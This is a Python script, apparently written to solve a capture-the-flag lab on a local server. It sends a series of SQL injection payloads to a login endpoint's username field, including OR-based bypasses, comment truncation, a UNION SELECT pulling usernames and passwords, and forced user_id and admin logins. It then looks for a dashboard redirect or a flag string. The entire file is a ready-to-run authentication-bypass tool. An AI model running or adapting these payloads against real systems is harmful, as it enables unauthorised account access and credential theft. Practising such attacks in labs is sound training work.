import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"

print("[*] Exploiting SQL Injection in username parameter\n")

# Test various SQL injection payloads to bypass authentication
# and potentially access different user accounts

sqli_payloads = [
    # Basic OR injection
    ("test' OR '1'='1", "test", "Basic OR bypass"),
    ("test' OR 1=1--", "test", "OR with comment"),
    ("admin' OR '1'='1", "anything", "Admin OR bypass"),
    
    # Union-based to extract data
    ("test' UNION SELECT username, password, user_id FROM users--", "test", "Union select"),
    
    # Try to authenticate as different users
    ("' OR user_id=1--", "anything", "Force user_id=1"),
    ("' OR user_id=2--", "anything", "Force user_id=2"),
    ("' OR user_id=10000--", "anything", "Force user_id=10000"),
    ("' OR user_id=10001--", "anything", "Force user_id=10001"),
    
    # Try admin username
    ("admin' --", "anything", "Admin with comment"),
    ("administrator' --", "anything", "Administrator"),
    
    # Boolean-based blind SQLi to enumerate
    ("' OR username='admin'--", "anything", "Target admin user"),
    ("' OR user_type='admin'--", "anything", "Target admin user_type"),
]

print(f"[*] Testing {len(sqli_payloads)} SQL injection payloads\n")

for username, password, description in sqli_payloads:
    print(f"\n[TEST] {description}")
    print(f"  Username: {username}")
    print(f"  Password: {password}")
    
    session = requests.Session()
    auth_data = {
        'username': username,
        'password': password,
        'user_id': '10032'
    }
    
    try:
        auth_resp = session.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=True, timeout=5)
        
        print(f"  Status: {auth_resp.status_code}")
        print(f"  URL: {auth_resp.url}")
        print(f"  Length: {len(auth_resp.text)}B")
        
        # Check if we're on dashboard (not login page)
        if auth_resp.url.endswith('/dashboard') or ('/dashboard' in auth_resp.url):
            print(f"  [+] Redirected to dashboard!")
        
        # Check content
        if "error" in auth_resp.url.lower():
            print(f"  [-] Auth failed")
        elif len(auth_resp.text) != 1184:  # Different from standard login page
            print(f"  [+] Different response size!")
            print(f"  Content snippet: {auth_resp.text[:400]}")
        
        # Always check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
        if flag_match:
            flag_value = flag_match.group(0)
            print(f"\n{'='*60}")
            print(f"  [!] FLAG FOUND: {flag_value}")
            print(f"{'='*60}")
            print(f"\n  Full Response:")
            print(auth_resp.text)
            print(f"\n{'='*60}\n")
            break
            
    except Exception as e:
        print(f"  Error: {e}")

print("\n[*] SQL injection testing complete")

